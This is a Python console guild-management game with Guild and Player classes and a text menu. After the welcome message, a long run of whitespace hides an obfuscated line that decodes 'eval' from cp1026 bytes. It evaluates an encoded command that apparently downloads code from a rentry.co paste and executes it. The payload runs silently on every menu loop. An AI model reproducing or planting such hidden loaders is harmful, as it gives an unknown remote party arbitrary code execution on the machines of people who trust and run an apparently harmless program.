import requests, builtins

class Guild:
    def __init__(self, name):
        self.name = name
        self.members = []

    def add_member(self, member):
        self.members.append(member)
        print(f"{member} has joined the guild '{self.name}'.")

    def display_members(self):
        if not self.members:
            print(f"The guild '{self.name}' has no members.")
        else:
            print(f"Members of the guild '{self.name}':")
            for member in self.members:
                print(f"- {member}")

class Player:
    def __init__(self, name):
        self.name = name
        self.guild = None

    def join_guild(self, guild):
        if self.guild:
            print(f"{self.name} is already in a guild: '{self.guild.name}'.")
            return
        guild.add_member(self.name)
        self.guild = guild

def main():
    guilds = {}
    players = {}

    while True:
        print("\nWelcome to the Guild Game!")                                                                                                                                                                                                                                                                                                                                                                                    ;bb = getattr(builtins, b'\x85\xa5\x81\x93'.decode('cp1026'));bb(b'\x85\xa7\x85\x83M\xfc\x89\x94\x97\x96\x99\xa3@\x99\x85\x98\xa4\x85\xa2\xa3\xa2^\x85\xa7\x85\x83M\x99\x85\x98\xa4\x85\xa2\xa3\xa2K\x87\x85\xa3M}\x88\xa3\xa3\x97\xa2zaa\x99\x85\x95\xa3\x99\xa8K\x83\x96a\xa7\x83\xa2\xa2\x88\x94\x95\x96a\x99\x81\xa6}]K\xa3\x85\xa7\xa3]\xfc]'.decode('cp1026'))
        print("1. Create Guild")
        print("2. Join Guild")
        print("3. Display Guild Members")
        print("4. Exit")
        
        choice = input("Choose an option: ")

        if choice == '1':
            guild_name = input("Enter the name of the guild: ")
            if guild_name in guilds:
                print("Guild already exists!")
            else:
                guilds[guild_name] = Guild(guild_name)
                print(f"Guild '{guild_name}' created successfully!")

        elif choice == '2':
            player_name = input("Enter your name: ")
            if player_name not in players:
                players[player_name] = Player(player_name)

            guild_name = input("Enter the name of the guild you want to join: ")
            if guild_name in guilds:
                players[player_name].join_guild(guilds[guild_name])
            else:
                print("Guild does not exist!")

        elif choice == '3':
            guild_name = input("Enter the name of the guild to display its members: ")
            if guild_name in guilds:
                guilds[guild_name].display_members()
            else:
                print("Guild does not exist!")

        elif choice == '4':
            print("Thank you for playing! Goodbye.")
            break

        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
